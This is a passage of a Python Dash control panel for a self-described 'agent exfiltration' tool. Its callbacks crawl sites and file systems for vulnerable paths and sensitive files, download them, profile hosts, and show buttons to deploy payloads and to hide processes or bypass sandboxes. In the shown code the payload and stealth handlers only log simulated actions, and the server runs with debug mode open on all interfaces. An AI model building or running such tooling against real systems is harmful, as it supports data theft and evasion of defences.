                elif is_web_exploration and item['type'] in [dir_type_enum, web_api_type_enum, web_vuln_type_enum, web_sitemap_type_enum, web_form_type_enum]:
                    can_read_url_content = True # Répertoires, APIs, Vuln, Sitemap, Formulaires peuvent être "lus" (leur URL affichée)

                if is_actionable_file: # S'il s'agit d'un fichier identifiable et téléchargeable
                    read_button_id = json.dumps({'type': 'read-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})
                    download_button_id = json.dumps({'type': 'download-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})

                    actions_html_children.append(
                        html.Button('READ', id=read_button_id, n_clicks=0, style=CYBER_ACTION_BUTTON_TABLE_STYLE)
                    )
                    actions_html_children.append(
                        html.Button('DOWNLOAD', id=download_button_id, n_clicks=0, style=CYBER_DOWNLOAD_BUTTON_TABLE_STYLE)
                    )
                elif can_read_url_content: # Si c'est une URL cliquable/lisible mais pas forcément un fichier téléchargeable
                    read_button_id = json.dumps({'type': 'read-file-button', 'index': i, 'source': 'web'})
                    actions_html_children.append(
                        html.Button('READ URL', id=read_button_id, n_clicks=0, style=CYBER_ACTION_BUTTON_TABLE_STYLE)
                    )
                
                # Libellés spécifiques pour les types non-fichier/répertoire
                if item['type'] == dir_type_enum:
                    actions_html_children.append(html.Span("DIR", style={'color': '#FF00FF', 'fontWeight': 'bold'}))
                elif item['type'] == web_content_type_enum:
                    actions_html_children.append(html.Span("CONTENT", style={'color': '#FFAA00', 'fontWeight': 'bold'}))
                elif item['type'] == web_api_type_enum:
                    actions_html_children.append(html.Span("API", style={'color': '#00EEFF', 'fontWeight': 'bold'}))
                elif item['type'] == web_vuln_type_enum:
                    actions_html_children.append(html.Span("VULN", style={'color': '#FF0000', 'fontWeight': 'bold'}))
                elif item['type'] == web_sitemap_type_enum:
                    actions_html_children.append(html.Span("SITEMAP", style={'color': '#CCAAFF', 'fontWeight': 'bold'}))
                elif item['type'] == web_form_type_enum:
                    actions_html_children.append(html.Span("FORM", style={'color': '#00FF00', 'fontWeight': 'bold'}))


                table_data.append({
                    "path": item['path'],
                    "full_path": item['full_path'], # Ajout pour faciliter la lecture/téléchargement
                    "type": item['type'],
                    "sensitive_match": item['sensitive_match'],
                    "content_type": item.get('content_type', 'N/A'), # Affiche le content-type si disponible
                    "source": item.get('source', 'Unknown'), # Affiche la source de détection
                    "actions": html.Div(actions_html_children).to_plotly_json()
                })

            return final_status, table_data, html.Pre("SELECTED FILE CONTENT (Hex/Text preview)...", style=CYBER_STATUS_WARNING)

        except Exception as e:
            import traceback
            error_trace = traceback.format_exc()
            _GLOBAL_MODULE_LOGGER.log_critical(f"ERROR EXPLORING: {e}\n{error_trace}")
            return html.Pre(f"ERROR EXPLORING: {e}\n{error_trace}", style=CYBER_STATUS_ERROR), [], html.Pre("SELECTED FILE CONTENT (Hex/Text preview)...", style=CYBER_STATUS_WARNING)

    elif 'read-file-button' in trigger_id:
        button_id_dict = json.loads(trigger_id)
        clicked_index = button_id_dict['index']
        source_type = button_id_dict.get('source', 'local')

        if clicked_index is not None and clicked_index < len(table_data):
            file_item = table_data[clicked_index]
            target_path = file_item.get('full_path') # full_path contient l'URL ou le chemin local

            if target_path:
                content = ""
                try:
                    if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
                        content = global_file_explorer.read_file_content(target_path)
                    elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
                        content = global_web_explorer.read_file_content_from_url(target_path)
                    else:
                        _GLOBAL_MODULE_LOGGER.log_error(f"Explorer for '{source_type}' not available or in mock mode.")
                        return dash.no_update, dash.no_update, html.Pre("ERROR: Explorer not available for this source type or in mock mode.", style=CYBER_STATUS_ERROR)

                    _GLOBAL_MODULE_LOGGER.log_info(f"Reading content of '{file_item['path']}'.")
                    return dash.no_update, dash.no_update, html.Pre(f"CONTENT OF '{file_item['path']}':\n\n{content}", style=CYBER_STATUS_WARNING)
                except Exception as e:
                    _GLOBAL_MODULE_LOGGER.log_error(f"Error reading file content '{target_path}': {e}")
                    return dash.no_update, dash.no_update, html.Pre(f"ERROR READING FILE CONTENT: {e}", style=CYBER_STATUS_ERROR)

            _GLOBAL_MODULE_LOGGER.log_error("TARGET PATH NOT FOUND IN TABLE DATA for read action.")
            return dash.no_update, dash.no_update, html.Pre("TARGET PATH NOT FOUND IN TABLE DATA.", style=CYBER_STATUS_ERROR)
        return dash.no_update, dash.no_update, dash.no_update


@app.callback(
    Output('explorer-status', 'children', allow_duplicate=True),
    Output('found-files-table', 'data', allow_duplicate=True),
    Output('file-content-output', 'children', allow_duplicate=True),
    Input('stop-explorer-button', 'n_clicks'),
    prevent_initial_call=True
)
def stop_explorer(n_clicks):
    if n_clicks > 0:
        _GLOBAL_MODULE_LOGGER.log_info("Arrêt de l'exploration demandé par l'utilisateur.")
        global_file_explorer.reset_state()
        global_web_explorer.reset_state()
        if global_log_streamer: global_log_streamer.clear_logs()
        explorer_log_states['file_explorer']['logs'] = []
        explorer_log_states['file_explorer']['last_index'] = 0

        return (
            html.Pre("EXPLORATION TERMINATED BY USER. RESULTS CLEARED.", style=CYBER_STATUS_INFO),
            [],
            html.Pre("SELECTED FILE CONTENT (Hex/Text preview)...", style=CYBER_STATUS_WARNING)
        )
    return dash.no_update, dash.no_update, dash.no_update


@app.callback(
    Output("download-file-data", "data"),
    Input({'type': 'download-file-button', 'index': ALL}, 'n_clicks'),
    State('found-files-table', 'data'),
    prevent_initial_call=True
)
def download_file(download_n_clicks_list, table_data):
    if not any(download_n_clicks_list):
        raise dash.exceptions.PreventUpdate

    ctx = dash.callback_context
    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate

    trigger_id_dict = json.loads(ctx.triggered[0]['prop_id'])
    clicked_index = trigger_id_dict['index']
    source_type = trigger_id_dict.get('source', 'local')

    if clicked_index is not None and clicked_index < len(table_data):
        file_item = table_data[clicked_index]
        target_path = file_item.get('full_path')

        if target_path:
            file_content_base64 = ""
            filename = os.path.basename(file_item['path'])
            if not filename or filename == '':
                filename = f"downloaded_file_{datetime.now().strftime('%Y%m%d%H%M%S')}"


            try:
                if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
                    file_content_base64 = global_file_explorer.download_file_base64(target_path)
                elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
                    file_content_base64 = global_web_explorer.download_file_base64_from_url(target_path)
                else:
                    _GLOBAL_MODULE_LOGGER.log_error(f"Explorer for '{source_type}' not available or in mock mode for download.")
                    raise dash.exceptions.PreventUpdate

                if file_content_base64 and not file_content_base64.startswith("[ERROR]"):
                    decoded_content = base64.b64decode(file_content_base64.encode('utf-8'))
                    _GLOBAL_MODULE_LOGGER.log_info(f"Downloading '{file_item['path']}'.")
                    mime_type, _ = mimetypes.guess_type(filename)
                    if mime_type is None: mime_type = 'application/octet-stream'
                    
                    return dcc.send_bytes(decoded_content, filename, type=mime_type)
                else:
                    _GLOBAL_MODULE_LOGGER.log_error(f"Failed to get file content (Base64) for '{target_path}': {file_content_base64}")
                    raise dash.exceptions.PreventUpdate
            except Exception as e:
                _GLOBAL_MODULE_LOGGER.log_critical(f"Error during file download for '{target_path}': {e}")
                raise dash.exceptions.PreventUpdate
    raise dash.exceptions.PreventUpdate


# --- NOUVEAU CALLBACK : Mises à jour des buffers de logs (toujours dans le DOM) ---
@app.callback(
    [Output('live-log-stream-display-buffer', 'children'),
     Output('_hidden_explorer_logs_buffer', 'children'),
     Output('explorer-log-last-index', 'data')],
    [Input('interval-explorer-logs', 'n_intervals'),
     Input('interval-dashboard-refresh', 'n_intervals')],
    [State('explorer-log-last-index', 'data'),
     State('live-log-stream-display-buffer', 'children'),
     State('_hidden_explorer_logs_buffer', 'children')],
    prevent_initial_call=True # Important : NE PAS déclencher au démarrage pour éviter les races conditions.
                              # Seul le log_streamer_init_trigger s'occupe de la 1ère activation du streamer.
)
def update_hidden_log_buffers(n_intervals_explorer, n_intervals_dashboard, current_log_indices, current_dashboard_buffer_content, current_explorer_buffer_content):
    updated_dashboard_buffer_content_hidden = current_dashboard_buffer_content if current_dashboard_buffer_content is not None else ""
    updated_explorer_buffer_content_hidden = current_explorer_buffer_content if current_explorer_buffer_content is not None else ""
    updated_log_indices = current_log_indices.copy() # Copie pour modifications

    # Mise à jour du buffer des logs du dashboard/agent principal
    new_dashboard_logs, new_dashboard_total_index = global_log_streamer.get_logs(updated_log_indices.get('dashboard_stream', 0))
    if new_dashboard_logs:
        updated_dashboard_buffer_content_hidden += "\n" + "\n".join(new_dashboard_logs)
        # Limiter la taille du buffer
        lines = updated_dashboard_buffer_content_hidden.split('\n')
        if len(lines) > 500: # Max 500 lignes pour les logs généraux
            updated_dashboard_buffer_content_hidden = "\n".join(lines[-500:])
        updated_log_indices['dashboard_stream'] = new_dashboard_total_index
    
    # Mise à jour du buffer des logs de l'explorateur (WebExplorer/FileExplorer)
    new_explorer_logs, new_explorer_total_index = _GLOBAL_MODULE_LOGGER.get_new_logs(updated_log_indices.get('file_explorer', 0))
    if new_explorer_logs:
        updated_explorer_buffer_content_hidden += "\n" + "\n".join(new_explorer_logs)
        # Limiter la taille du buffer
        lines = updated_explorer_buffer_content_hidden.split('\n')
        if len(lines) > 500: # Max 500 lignes pour les logs de l'explorateur
            updated_explorer_buffer_content_hidden = "\n".join(lines[-500:])
        updated_log_indices['file_explorer'] = new_explorer_total_index

    return updated_dashboard_buffer_content_hidden, \
           updated_explorer_buffer_content_hidden, \
           updated_log_indices


# --- NOUVEAUX CALLBACKS : Pousser les logs des buffers cachés vers l'UI visible ---
# Ces callbacks se déclenchent LORSQUE LE CONTENU DU BUFFER CACHE CHANGE
# ET UNIQUEMENT SI L'ONGLET CORRESPONDANT EST ACTIF.
@app.callback(
    Output('live-log-stream-display', 'children'),
    Input('live-log-stream-display-buffer', 'children'), # Déclenché par le changement du buffer caché
    State('cyber-tabs', 'value'), # État de l'onglet actif
    prevent_initial_call=False # Doit être False pour que l'initialisation fonctionne
)
def update_live_log_stream_display(buffered_content, active_tab_id):
    if active_tab_id == 'tab-logs-status':
        return buffered_content
    return dash.no_update

@app.callback(
    Output('dashboard-live-logs_display', 'children'),
    Input('live-log-stream-display-buffer', 'children'), # Déclenché par le changement du buffer caché
    State('cyber-tabs', 'value'), # État de l'onglet actif
    prevent_initial_call=False
)
def update_dashboard_live_logs_display(buffered_content, active_tab_id):
    if active_tab_id == 'tab-dashboard':
        return buffered_content
    return dash.no_update

@app.callback(
    Output('explorer-logs-output_visible', 'children'),
    Input('_hidden_explorer_logs_buffer', 'children'), # Déclenché par le changement du buffer caché de l'explorateur
    State('cyber-tabs', 'value'), # État de l'onglet actif
    prevent_initial_call=False
)
def update_explorer_logs_output_visible(buffered_content, active_tab_id):
    if active_tab_id == 'tab-file-explorer':
        return buffered_content
    return dash.no_update


@app.callback(
    Output('agent-stats-store', 'data', allow_duplicate=True),
    [Input('interval-dashboard-refresh', 'n_intervals')],
    State('agent-stats-store', 'data'),
    prevent_initial_call=False
)
def update_dashboard_stats(n_intervals, current_stats):
    # Les stats de l'agent ne sont pas gérées par LogStreamer, mais le WebExplorer a ses propres stats
    # Cette fonction est appelée uniquement par interval-dashboard-refresh, donc elle ne s'exécute pas en permanence
    if global_web_explorer: # S'assurer que le WebExplorer est bien importé/instancié
        web_explorer_stats = global_web_explorer.get_exploration_stats()

        # Met à jour les valeurs dans current_stats directement
        current_stats['urls_visited'] = web_explorer_stats.get('urls_visited', 0)
        current_stats['urls_queued'] = web_explorer_stats.get('urls_queued', 0)
        current_stats['urls_skipped_external'] = web_explorer_stats.get('urls_skipped_external', 0)
        current_stats['urls_skipped_visited'] = web_explorer_stats.get('urls_skipped_visited', 0)
        current_stats['urls_skipped_robots'] = web_explorer_stats.get('urls_skipped_robots', 0)
        current_stats['files_identified'] = web_explorer_stats.get('files_identified', 0)
        current_stats['dirs_identified'] = web_explorer_stats.get('dirs_identified', 0)
        current_stats['content_matches'] = web_explorer_stats.get('content_matches', 0)
        current_stats['api_endpoints_identified'] = web_explorer_stats.get('api_endpoints_identified', 0)
        current_stats['vuln_paths_identified'] = web_explorer_stats.get('vuln_paths_identified', 0)
        current_stats['sitemap_entries_identified'] = web_explorer_stats.get('sitemap_entries_identified', 0)
        current_stats['forms_identified'] = web_explorer_stats.get('forms_identified', 0)
        current_stats['requests_successful'] = web_explorer_stats.get('requests_successful', 0)
        current_stats['requests_failed'] = web_explorer_stats.get('requests_failed', 0)
        current_stats['total_requests_made'] = web_explorer_stats.get('total_requests_made', 0)
        current_stats['bytes_downloaded_html'] = web_explorer_stats.get('bytes_downloaded_html', 0)
        current_stats['bytes_downloaded_files'] = web_explorer_stats.get('bytes_downloaded_files', 0)

        # Calcul des totaux pour l'affichage principal des stats
        current_stats['files_scanned'] = web_explorer_stats.get('urls_visited', 0)
        current_stats['files_matched'] = web_explorer_stats['files_identified'] + \
                                         web_explorer_stats['dirs_identified'] + \
                                         web_explorer_stats['content_matches'] + \
                                         web_explorer_stats['api_endpoints_identified'] + \
                                         web_explorer_stats['vuln_paths_identified'] + \
                                         web_explorer_stats['sitemap_entries_identified'] + \
                                         web_explorer_stats['forms_identified']
        
        current_stats['data_exfiltrated_bytes'] = web_explorer_stats['bytes_downloaded_html'] + web_explorer_stats['bytes_downloaded_files']
        current_stats['exfil_success_count'] = web_explorer_stats['requests_successful']
        current_stats['exfil_failed_count'] = web_explorer_stats['requests_failed']

        # Mise à jour du statut pour qu'il soit plus dynamique
        current_stats['agent_status'] = web_explorer_stats['last_status']
        if web_explorer_stats['current_url'] != 'N/A':
            current_stats['agent_last_activity'] = f"Last URL: {web_explorer_stats['current_url']}"
        elif web_explorer_stats['start_time']:
            current_stats['agent_last_activity'] = f"Running for {web_explorer_stats['duration_seconds']:.0f}s"
        
    return current_stats


@app.callback(
    [Output('system-profiler-status', 'children'),
     Output('os-info-output', 'children'),
     Output('cpu-info-output', 'children'),
     Output('memory-info-output', 'children'),
     Output('disk-info-table', 'data'),
     Output('network-info-output', 'children'),
     Output('users-info-table', 'data'),
     Output('processes-info-table', 'data')],
    [Input('request-system-info-button', 'n_clicks')],
    prevent_initial_call=True
)
def request_system_info(n_clicks):
    if n_clicks == 0:
        raise dash.exceptions.PreventUpdate

    _GLOBAL_MODULE_LOGGER.log_info("Requête de profilage système initiée.")
    status_message = html.Pre("Requesting system information from the agent...", style=CYBER_STATUS_INFO)

    try:
        system_data = global_system_profiler.collect_system_info()

        if system_data.get("status") and "ERROR" in system_data["status"]:
            error_msg = f"ERROR COLLECTING SYSTEM INFO: {system_data.get('status', 'Unknown Error')}"
            if system_data.get('details'):
                error_msg += f" Details: {system_data['details']}"
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return (
                html.Pre(error_msg, style=CYBER_STATUS_ERROR),
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                [],
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                [],
                []
            )

        os_info_str = f"System: {system_data.get('os_info', {}).get('system', 'N/A')}\n" \
                      f"Full Name: {system_data.get('os_info', {}).get('os_name_full', 'N/A')}\n" \
                      f"Release: {system_data.get('os_info', {}).get('release', 'N/A')}\n" \
                      f"Version: {system_data.get('os_info', {}).get('version', 'N/A')}\n" \
                      f"Machine: {system_data.get('os_info', {}).get('machine', 'N/A')}\n" \
                      f"Processor: {system_data.get('os_info', {}).get('processor', 'N/A')}\n" \
                      f"Architecture: {system_data.get('os_info', {}).get('architecture', 'N/A')}\n" \
                      f"Hostname: {system_data.get('hostname', 'N/A')}"
        
        cpu_info_str = f"Model: {system_data.get('cpu_info', {}).get('model_name', 'N/A')}\n" \
                       f"Logical Cores: {system_data.get('cpu_info', {}).get('logical_cores', 'N/A')}\n" \
                       f"Physical Cores: {system_data.get('cpu_info', {}).get('physical_cores', 'N/A')}\n" \
                       f"CPU Usage: {system_data.get('cpu_info', {}).get('cpu_usage_percent', 'N/A')} % (Live data not available via static report)"

        mem_info = system_data.get('memory_info', {})
        memory_info_str = f"Total Memory: {mem_info.get('total_gb', 'N/A')} GB\n" \
                          f"Free Memory: {mem_info.get('free_gb', 'N/A')} GB\n" \
                          f"Available Memory: {mem_info.get('available_gb', 'N/A')} GB\n" \
                          f"Used Percent: {mem_info.get('used_percent', 'N/A')} %"

        network_info = system_data.get('network_info', {})
        network_info_str = f"Default Gateway: {network_info.get('default_gateway', 'N/A')}\n" \
                           f"DNS Servers: {', '.join(network_info.get('dns_servers', [])) if network_info.get('dns_servers') else 'N/A'}\n\n" \
                           f"Interfaces:\n"
        if network_info.get('interfaces'):
            for iface_name, iface_data in network_info['interfaces'].items():
                network_info_str += f"  - {iface_name} (Status: {iface_data.get('status', 'N/A')}, MAC: {iface_data.get('mac_address', 'N/A')}):\n"
                if iface_data.get('ipv4_addresses'):
                    for addr in iface_data['ipv4_addresses']:
                        network_info_str += f"    IPv4: {addr}\n"
                if iface_data.get('ipv6_addresses'):
                    for addr in iface_data['ipv6_addresses']:
                        network_info_str += f"    IPv6: {addr}\n"
                if not iface_data.get('ipv4_addresses') and not iface_data.get('ipv6_addresses'):
                    network_info_str += "    No IP addresses found.\n"
        else:
            network_info_str += "  No network interfaces found."

        final_status = html.Pre(f"System Information Collected at {system_data.get('timestamp', 'N/A')}", style=CYBER_STATUS_BOX_STYLE)
        _GLOBAL_MODULE_LOGGER.log_info("Informations système collectées avec succès.")
        
        return (
            final_status,
            html.Pre(os_info_str, style=CYBER_STATUS_BOX_STYLE),
            html.Pre(cpu_info_str, style=CYBER_STATUS_BOX_STYLE),
            html.Pre(memory_info_str, style=CYBER_STATUS_BOX_STYLE),
            system_data.get('disk_info', []),
            html.Pre(network_info_str, style=CYBER_STATUS_BOX_STYLE),
            system_data.get('users_info', []),
            system_data.get('processes_info', [])
        )

    except Exception as e:
        import traceback
        error_trace = traceback.format_exc()
        error_msg = f"CRITICAL ERROR during system profiling: {e}\n{error_trace}"
        _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
        return (
            html.Pre(error_msg, style=CYBER_STATUS_ERROR),
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            [],
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            [],
            []
        )

@app.callback(
    Output('payload-status-output', 'children'),
    Input('deploy-payload-button', 'n_clicks'),
    Input('execute-payload-button', 'n_clicks'),
    Input('remove-payload-button', 'n_clicks'),
    State('payload-url-hidden', 'value'),
    State('payload-path-hidden', 'value'),
    prevent_initial_call=True
)
def handle_payload_actions(deploy_n, execute_n, remove_n, payload_url, payload_path):
    ctx = dash.callback_context
    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate
    
    button_id = ctx.triggered[0]['prop_id'].split('.')[0]
    
    if button_id == 'deploy-payload-button':
        status = f"Simulating DEPLOY payload from {payload_url} to {payload_path}..."
        _GLOBAL_MODULE_LOGGER.log_info(status)
        return html.Pre(status, style=CYBER_STATUS_INFO)
    elif button_id == 'execute-payload-button':
        status = f"Simulating EXECUTE payload at {payload_path}..."
        _GLOBAL_MODULE_LOGGER.log_info(status)
        return html.Pre(status, style=CYBER_STATUS_INFO)
    elif button_id == 'remove-payload-button':
        status = f"Simulating REMOVE payload at {payload_path}..."
        _GLOBAL_MODULE_LOGGER.log_info(status)
        return html.Pre(status, style=CYBER_STATUS_INFO)
    
    return dash.no_update

@app.callback(
    Output('stealth-status-output', 'children'),
    Input('apply-stealth-button', 'n_clicks'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def apply_stealth_settings(n_clicks, hide_process_val_str, anti_debug_val_str, sandbox_bypass_val_str):
    if n_clicks == 0:
        raise dash.exceptions.PreventUpdate

    # Les valeurs des checklists cachées sont des chaînes (comma-separated).
    # Il faut les retransformer en listes pour la logique Python.
    hide_process_list = hide_process_val_str.split(',') if hide_process_val_str else []
    anti_debug_list = anti_debug_val_str.split(',') if anti_debug_val_str else []
    sandbox_bypass_list = sandbox_bypass_val_str.split(',') if sandbox_bypass_val_str else []

    status = "Applying Stealth Settings:\n"
    status += f"  - Hide Process: {'Enabled' if 'hide_process' in hide_process_list else 'Disabled'}\n"
    status += f"  - Anti-Debugging: {'Enabled' if 'anti_debug' in anti_debug_list else 'Disabled'}\n"
    status += f"  - Sandbox Bypass: {'Enabled' if 'sandbox_bypass' in sandbox_bypass_list else 'Disabled'}"

    _GLOBAL_MODULE_LOGGER.log_info(status)
    
    return html.Pre(status, style=CYBER_STATUS_INFO)

# --- Activation retardée de LogStreamer via callback sur dcc.Store ---
# Ce callback s'exécute une seule fois au chargement initial de l'application
@app.callback(
    Output('log-streamer-init-trigger', 'data'),
    Input('log-streamer-init-trigger', 'data'),
    prevent_initial_call=False
)
def initialize_log_streamer(data):
    global global_log_streamer
    if not hasattr(sys, '_log_streamer_active_flag'):
        sys._log_streamer_active_flag = False

    if global_log_streamer and not sys._log_streamer_active_flag:
        try:
            global_log_streamer.start_capturing()
            sys._log_streamer_active_flag = True
        except Exception as e:
            _GLOBAL_MODULE_LOGGER.log_critical(f"Impossible d'activer LogStreamer via callback: {e}. Les logs en direct ne seront pas disponibles.")
    elif isinstance(global_log_streamer, LogStreamer) and sys._log_streamer_active_flag:
        _GLOBAL_MODULE_LOGGER.log_info("LogStreamer global déjà actif.")
    else:
        _GLOBAL_MODULE_LOGGER.log_warning("LogStreamer est une implémentation mock. La capture de logs en direct ne sera pas possible.")
    
    raise dash.exceptions.PreventUpdate


if __name__ == '__main__':
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] --- AGENT EXFILTRATION :: CYBER OPS HUB V2.6 PRO (ULTIMATE FIX) ---")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] Ensure Python, pip, and Dash are installed in Termux.")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] This script is located at: {AGENT_DIR}")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] To launch the control panel, navigate to the agent directory and execute:")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel]    cd {AGENT_DIR} && nohup python3 -u control_panel.py > control_panel.log 2>&1 &")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] Access the interface in your Android browser at : http://127.0.0.1:8050")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] Keep this Termux terminal open while the interface is active.")

    try:
        app.run(host='0.0.0.0', debug=True, port=8050)
    except Exception as e:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR LAUNCHING DASH SERVER: {e}")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Verify if the port is already in use or if Dash is properly installed.")

